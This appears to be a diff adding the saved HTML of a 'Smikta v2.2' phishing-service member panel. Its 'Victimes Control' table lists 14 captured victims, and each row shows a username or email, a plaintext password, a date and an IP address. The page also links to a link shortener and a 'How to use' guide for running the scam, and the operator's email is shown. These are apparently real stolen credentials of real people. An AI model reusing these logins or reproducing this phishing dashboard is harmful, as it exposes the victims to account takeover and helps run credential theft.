@@ -1,0 +1,585 @@
+
+      <body>
+        <div style='display:none' id='sbbhscc'></div>
+          <script type="text/javascript">
+            var sbbvscc='';
+            var sbbgscc='';
+            function genPid() {return String.fromCharCode(68)+String.fromCharCode(121) ; };
+          </script>
+        <div id='sbbfrcc' style='position: absolute; top: -10px; left: 30px; font-size:1px'></div>
+  <script type="text/javascript">(function(XHR){var open=XHR.prototype.open;var send=XHR.prototype.send;var parser=document.createElement('a');XHR.prototype.open=function(method, url, async, user, pass){if(typeof async=='undefined'){async=true;}parser.href=url;if(parser.host==''){parser.href=parser.href;}this.ajax_hostname=parser.hostname;open.call(this, method, url, async, user, pass);};XHR.prototype.send=function(data){if(location.hostname==this.ajax_hostname)this.setRequestHeader("X-MOD-SBB-CTYPE", "xhr");send.call(this, data);}})(XMLHttpRequest);if(typeof(fetch)!="undefined"){var nsbbfetch=fetch;fetch=function(url, init){if(typeof(url)==="object" && typeof(url.url)==="string"){init={method: url.method, mode: url.mode, cache: url.cache, credentials: url.credentials, headers: url.headers, body: url.body};url=url.url;}function sbbSd(url, domain){var parser=document.createElement('a');parser.href=url;if(parser.host==''){parser.href=parser.href;}return parser.hostname==location.hostname;}if(sbbSd(url, document.domain)){init=typeof init !=='undefined' ? init :{};if(typeof(init.headers)==="undefined"){init.headers={};}init.headers['X-MOD-SBB-CTYPE']='fetch';}return nsbbfetch(url, init);};}function sbbgc(check_name){var start=document.cookie.indexOf(check_name+"=");var oVal='';var len=start+check_name.length+1;if((!start)&&(document.cookie.substring(0,check_name.length)!=check_name)){oVal='';}else if(start==-1){oVal='';}else{var end=document.cookie.indexOf(';',len);if(end==-1)end=document.cookie.length;var oVal=document.cookie.substring(len,end);};return oVal;}function addmg(inm,ext){var primgobj=document.createElement('IMG');primgobj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+"/sbbi/?sbbpg="+inm+(ext?"&"+ext:"");var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(primgobj);};function addprid(prid){var oldVal=sbbgc("PRLST");if((oldVal.indexOf(prid)==-1)&&(oldVal.split('/').length<5)){if(oldVal!=''){oldVal+='/';}document.cookie='PRLST='+oldVal+escape(prid)+';path=/; SameSite=Lax;';}}var sbbeccf=function(){this.sp3="jass";this.sf1=function(vd){return sf2(vd)+32;};var sf2=function(avd){return avd*12;};this.sf4=function(yavd){return yavd+2;};var strrp=function(str, key, value){if(str.indexOf('&'+key+'=')> -1 || str.indexOf(key+'=')==0){var idx=str.indexOf('&'+key+'=');if(idx==-1)idx=str.indexOf(key+'=');var end=str.indexOf('&', idx+1);var newstr;if(end !=-1)newstr=str.substr(0, idx)+str.substr(end+(idx ? 0 : 1))+'&'+key+'='+value;else newstr=str.substr(0, idx)+'&'+key+'='+value;return newstr;}else return str+'&'+key+'='+value;};var strgt=function(name, text){if(typeof text !='string')return "";var nameEQ=name+"=";var ca=text.split(/[;&]/);for(var i=0;i < ca.length;i++){var c=ca[i];while(c.charAt(0)==' ')c=c.substring(1, c.length);if(c.indexOf(nameEQ)==0)return c.substring(nameEQ.length, c.length);}return "";};this.sfecgs={sbbgh:function(){var domain=document.location.host;if(domain.indexOf('www.')==0)domain=domain.replace('www.', '');return domain;}, f:function(name, value){var fv="";if(window.globalStorage){var host=this.sbbgh();try{if(typeof(value)!="undefined")globalStorage[host][name]=value;else{fv=globalStorage[host][name];if(typeof(fv.toString)!="undefined")fv=fv.toString();}}catch(e){}}return fv;}, name:"sbbrf"};this.sfecls={f:function(name, value){var fv="";try{if(window.localStorage){if(typeof(value)!="undefined")localStorage.setItem(name, value);else{fv=localStorage.getItem(name);if(typeof(fv.toString)!="undefined")fv=fv.toString();}}}catch(e){}return fv;}, name:"sbbrf"};this.sbbcv=function(invl){try{var invalArr=invl.split("-");if(invalArr.length>1){if(invalArr[0]=="A"||invalArr[0]=="D"){invl=invalArr[1];}else invl="";}if(invl==null||typeof(invl)=="undefined"||invl=="falseImgUT"||invl=="undefined"||invl=="null"||invl!=encodeURI(invl))invl="";if(typeof(invl).toLowerCase()=="string")if(invl.length>20)if(invl.substr(0,2)!="h4")invl="";}catch(ex){invl="";}return invl;};this.sbbsv=function(fv){for(var elm in this){if(this[elm].name=="sbbrf"){this[elm].f("altutgv2",fv);}}document.cookie="UTGv2="+fv+';expires=Fri, 02-Sep-22 12:33:36 GMT;path=/; SameSite=Lax;';};this.sbbgv=function(){var valArr=Array();var currVal="";for(var elm in this){if(this[elm].name=="sbbrf"){currVal=this[elm].f("altutgv2");currVal=this.sbbcv(currVal);if(currVal!="")valArr[currVal]=(typeof(valArr[currVal])!="undefined"?valArr[currVal]+1:1);}}var lb=0;var fv="";for(var val in valArr){if(valArr[val]>lb){fv=val;lb=valArr[val]}}if(fv=="")fv=sbbgc("UTGv2");fv=this.sbbcv(fv);if(fv!="")this.sbbsv(fv);else this.sbbsv("h44f1fbcf183a95656c88fd1e9d6310d3c24");return fv;};};function m2vr(m1,m2){var i=0;var rc="";var est="ghijklmnopqrstuvwyz";var rnum;var rpl;var charm1=m1.charAt(i);var charm2=m2.charAt(i);while(charm1!=""||charm2!=""){rnum=Math.floor(Math.random()* est.length);rpl=est.substring(rnum,rnum+1);rc+=(charm1==""?rpl:charm1)+(charm2==""?rpl:charm2);i++;charm1=m1.charAt(i);charm2=m2.charAt(i);}return rc;}function sbbls(prid){try{var eut=sbbgc("UTGv2");window.sbbeccfi=new sbbeccf();window.sbbgs=sbbeccfi.sbbgv();if(eut!=sbbgs && sbbgs!="" && typeof(sbbfcr)=="undefined"){addmg('utMedia',"vii="+m2vr("db8544c0d42fa7543613c08058b2c2ed",sbbgs));}var sbbiframeObj=document.createElement('IFRAME');var dfx=new Date();sbbiframeObj.id='SBBCrossIframe';sbbiframeObj.title='SBBCrossIframe';sbbiframeObj.tabindex='-1';sbbiframeObj.lang='en';sbbiframeObj.style.visibility='hidden';sbbiframeObj.setAttribute('aria-hidden', 'true');sbbiframeObj.style.border='0px';if(document.all){sbbiframeObj.style.position='absolute';sbbiframeObj.style.top='-1px';sbbiframeObj.style.height='1px';sbbiframeObj.style.width='28px';}else{sbbiframeObj.style.height='1px';sbbiframeObj.style.width='0px';}sbbiframeObj.scrolling="NO";sbbiframeObj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+'/sbbi/?sbbpg=sbbShell&gprid='+prid+'';var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(sbbiframeObj);}catch(ex){;}}try{var y=unescape(sbbvscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));document.getElementById('sbbhscc').innerHTML=y;var x=unescape(sbbgscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));}catch(e){x='function genPid(){return "jser";}';}try{if(window.gprid==undefined)document.write('<'+'script type="text/javascri'+'pt">'+x+"var gprid=genPid();addprid(gprid);var sbbfcr=true;sbbls(gprid);<"+"/script>");}catch(e){addprid("dwer");}</script>
+<script type="text/javascript">
+    var vglnk = {key: '6e7dbe65aa0a0dc2b3c86b7c0df4a50a'};
+    (function(d, t) {
+        var s = d.createElement(t);
+            s.type = 'text/javascript';
+            s.async = true;
+            s.src = '//cdn.viglink.com/api/vglnk.js';
+        var r = d.getElementsByTagName(t)[0];
+            r.parentNode.insertBefore(s, r);
+    }(document, 'script'));
+</script>  <div id="fb-root"></div>
+      <script>
+        window.fbAsyncInit = function() {
+          FB.init({
+            xfbml            : true,
+            version          : 'v10.0'
+          });
+        };
+
+        (function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));
+      </script>
+
+      <!-- Your Plug-in Discussion code -->
+      <div class="fb-customerchat"
+        attribution="page_inbox"
+        page_id="241988469336741">
+      </div>
+</body>
+
+<head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2983396865211381"
+     crossorigin="anonymous"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0BRW176M3P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0BRW176M3P');
+</script>
+</head>
+﻿
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
+<script>
+  var OneSignal = window.OneSignal || [];
+  OneSignal.push(function() {
+    OneSignal.init({
+      appId: "d9f4814e-4d8c-4e8b-939f-c987c6b9da30",
+    });
+  });
+</script>
+<link rel="stylesheet" type="text/css" href="js/js.css" />
+
+<link rel="stylesheet" type="text/css" href="css/iconfont.css">
+
+<meta name="generator" content="HemzaDz">
+
+<meta name="keywords" content="HemzaDz" />
+
+<meta name="description" content="Feel free to browse the internet at school with us to unblock websites like Myspace, Bebo, Facebook, Friendster, hi5 and more! Designed by ..." />
+
+<meta name="copyright" content="© 2016 HemzaDz" />
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+
+<link rel="stylesheet" type="text/css" href="css/styles.css" />
+
+<script language="javascript" src="js/jquery.js"></script>
+
+<script language="javascript" src="js/global.js"></script>
+<script language="javascript" src="js/gtag.js"></script>
+<!-- Messenger Plug-in Discussion Code -->
+
+<title>Smikta   victims</title>
+
+</head>
+
+
+<p align="right"> 
+
+
+
+<img border="0" src="css/logo.png"></td>
+
+</p>
+
+ <div class="br"></div>
+
+<div class="navbar">
+
+
+			<ul>
+
+				<li><a href="index.php" ><span class="icon-home"></span>&nbsp;Home</a></li>	<ul id="nav-pro" class="nav-pro2">
+
+                                <li><a href="downloadvc.php" target="_blank"><span class="icon-youtube"></span>&nbsp;How to use</a></li>
+
+				<li><a href="index.php?mode=victims" class="active"><i class="fa fa-gift" aria-hidden="true"></i><span class="icon-gift"></span>&nbsp;My Victims&nbsp;<font color="#FF0000">14</span></b></a></li>
+				<li><a href="index.php?mode=last" class="active"><i class="fa fa-gift" aria-hidden="true"></i><span class="icon-gift"></span>&nbsp;Last Victims in 24H&nbsp;<font color="#FF0000">0</span></b></a></li>
+
+				<li><a href="index.php?mode=link" ><span class="icon-scissors"></span>&nbsp;Short Your Link</a></li>
+
+				<li><a href="index.php?method=logout"><span class="icon-exit"></span>&nbsp;Logout</a></li></ul>
+
+
+<p align="right"> 
+
+
+
+<td align="center"><a href="index.php"><img title="English" border="0" src="css/link-en.png"></a><a href="index-ar.php"><img title="Arabic" border="0" src="css/link-ar.png"></a></td>
+
+</p>  
+
+	<div id="content">
+
+	
+
+		<table border="0" cellpadding="0" width="100%">
+
+			<tr>
+
+				<td width="200" valign="top"><div class="head">.: Member Panel :.</div>	
+
+				<div class="bodypanel">
+
+                                <span class="icon-user"></span>
+
+
+
+                                User Email : <span><b>bomedi@gmail.com</b></span> <br />
+
+
+
+				User Name : <span><b>duaquao175</b></span> <br />
+
+  
+
+				All Victimes : <span><b>14</b></span> <br />
+
+				</div>
+
+					<div class="bodypanel">
+					    <style>
+      body .multicolortext {
+      background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red);   
+      -webkit-background-clip: text;
+      -moz-background-clip: text; 
+      background-clip: text;
+      color: transparent;
+      } 
+    </style>
+  </head>
+  <body>
+    <h1>
+
+
+<span class="multicolortext"><b>ADS</B></span>
+
+
+
+
+
+				</div></div></div></td>
+
+<td valign="top">
+
+
+</div><div class="head">.: Victimes Control :.</div>	
+
+				<div class="bodypanel">
+
+
+
+			<table border="1" width="100%">
+
+			
+
+				<tr class="tr3">
+
+					<td width="48" align="center" height="32">#</td>
+
+					<td align="center" height="32">Scama Disc</td>
+
+					<td align="center" height="32">User name</td>
+
+					<td align="center" height="32">User Pass</td>
+
+					<td align="center" height="32">Date</td>
+
+					<td align="center" height="32">Victime Ip</td>
+
+					<td align="center" height="32">Option the victims</td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">28113446</td>
+
+					<td align="center"></td>
+
+					<td align="center">esydo009@gmail.com</td>
+
+					<td align="center">elsi</td>
+
+					<td align="center">Sat 05 Mar 2022<br />08:02:59</td>
+
+					<td align="center"><b><font color="#005599">172.70.189.58</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=28113446">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">28113444</td>
+
+					<td align="center"></td>
+
+					<td align="center">esydo009@gmail.com</td>
+
+					<td align="center">elsi</td>
+
+					<td align="center">Sat 05 Mar 2022<br />08:02:48</td>
+
+					<td align="center"><b><font color="#005599">172.70.147.53</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=28113444">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24832788</td>
+
+					<td align="center"></td>
+
+					<td align="center">0393919050</td>
+
+					<td align="center">180226</td>
+
+					<td align="center">Tue 08 Feb 2022<br />13:59:56</td>
+
+					<td align="center"><b><font color="#005599">172.70.143.24</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24832788">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24832782</td>
+
+					<td align="center"></td>
+
+					<td align="center">0393919050</td>
+
+					<td align="center">180226</td>
+
+					<td align="center">Tue 08 Feb 2022<br />13:59:38</td>
+
+					<td align="center"><b><font color="#005599">172.70.188.11</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24832782">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24717760</td>
+
+					<td align="center"></td>
+
+					<td align="center">baonguyen20093</td>
+
+					<td align="center">trungdung289</td>
+
+					<td align="center">Wed 26 Jan 2022<br />03:18:57</td>
+
+					<td align="center"><b><font color="#005599">162.158.178.150</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24717760">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24710182</td>
+
+					<td align="center"></td>
+
+					<td align="center">truc50217@gmail.com</td>
+
+					<td align="center">truc88</td>
+
+					<td align="center">Tue 25 Jan 2022<br />13:17:00</td>
+
+					<td align="center"><b><font color="#005599">162.158.178.223</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24710182">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24710178</td>
+
+					<td align="center"></td>
+
+					<td align="center">truc50217@gmail.com</td>
+
+					<td align="center">truc88</td>
+
+					<td align="center">Tue 25 Jan 2022<br />13:16:50</td>
+
+					<td align="center"><b><font color="#005599">172.68.253.71</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24710178">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24710092</td>
+
+					<td align="center"></td>
+
+					<td align="center">truc50217@gmail.com</td>
+
+					<td align="center">truc88</td>
+
+					<td align="center">Tue 25 Jan 2022<br />13:01:23</td>
+
+					<td align="center"><b><font color="#005599">172.68.253.45</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24710092">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24709986</td>
+
+					<td align="center"></td>
+
+					<td align="center">trúc888</td>
+
+					<td align="center">16/12/2012</td>
+
+					<td align="center">Tue 25 Jan 2022<br />12:46:16</td>
+
+					<td align="center"><b><font color="#005599">162.158.179.92</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24709986">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24709974</td>
+
+					<td align="center"></td>
+
+					<td align="center">mìnhko nhờ</td>
+
+					<td align="center">T.Trúc</td>
+
+					<td align="center">Tue 25 Jan 2022<br />12:44:45</td>
+
+					<td align="center"><b><font color="#005599">162.158.179.119</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24709974">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24709958</td>
+
+					<td align="center"></td>
+
+					<td align="center">konhơ</td>
+
+					<td align="center">T.Anh</td>
+
+					<td align="center">Tue 25 Jan 2022<br />12:42:48</td>
+
+					<td align="center"><b><font color="#005599">162.158.179.48</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24709958">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24709936</td>
+
+					<td align="center"></td>
+
+					<td align="center">test</td>
+
+					<td align="center">test</td>
+
+					<td align="center">Tue 25 Jan 2022<br />12:40:59</td>
+
+					<td align="center"><b><font color="#005599">162.158.163.14</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24709936">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24430124</td>
+
+					<td align="center"></td>
+
+					<td align="center">.</td>
+
+					<td align="center">.</td>
+
+					<td align="center">Thu 06 Jan 2022<br />13:11:51</td>
+
+					<td align="center"><b><font color="#005599">172.70.92.172</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24430124">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr>				<tr class="tr3">
+
+					<td width="48" align="center">24430122</td>
+
+					<td align="center"></td>
+
+					<td align="center">1</td>
+
+					<td align="center">1</td>
+
+					<td align="center">Thu 06 Jan 2022<br />13:06:58</td>
+
+					<td align="center"><b><font color="#005599">162.158.166.247</font></b></td>
+
+					<td align="center"><a onclick="return confirm('Are You Sur To Delet This Victime');" href="?mode=victims&type=delet_victim&id=24430122">
+
+				<img "alt="Delet Victime" title="Delet This Victime" src="images/folder_delete.gif" border="0"></a></td>
+
+				</tr></table>
+
+		</div>﻿	<tr><td colspan="2">
+
+
+
+   <div align="center" class="bodypanel">
+
+<h4 style="text-align: center;"><strong>Copyright 2010-2021 | This Website Is Devlopped By <a href="https://www.facebook.com/Smiktanet-241988469336741/" target="_blank">HemzaDz</a>&nbsp;</strong></h4>
+
+<h4 style="text-align: center;"><strong>Smikta v2.2 &copy;</strong></h4></body>
+
+
+
+      </td>
+
+    </tr>
+
+  </table>
+
+
+<html>
+
+<head>
+
+<script type="text/javascript" src="css/jquery-facbook.js" ></script> 
+
+<script type="text/javascript" src="css/facbook.js"></script>
+
+<div class="hemzadz"></div>
+
+<script>
+
+$(document).ready(
+
+
+
+function(){
+
+$(".hemzadz").hemzadz(
+
+{
+
+
+
+   border:'1px #bbbbbb solid',
+
+   text: "Follow us on Facebook",
+
+   corner:"5px",
+
+   href:"https://www.facebook.com/pages/SmiktaCom/241988469336741",
+
+   icon_src:"css/close.png",   
+
+   minimize:"css/minimize.png",   
+
+   maximize:"css/maximize.png",	 	
+
+   text_position:"top",
+
+   text_font:"arial",
+
+   text_weight:"bold",
+
+   text_color:"#336699",
+
+   size:"16px",
+
+   background:"#ffffff",
+
+   position:"bottom-right",
+
+   popup_height:"30px",
+
+   popup_width:"300px",
+
+   timer:"0",
+
+   language:"en_US"
+
+}
+
+
+
+);
+
+}
+
+);
+
+</script>
+
+
+
+</body>
+
+</html>
+
+
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/58f35d66f7bbaa72709c6729/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
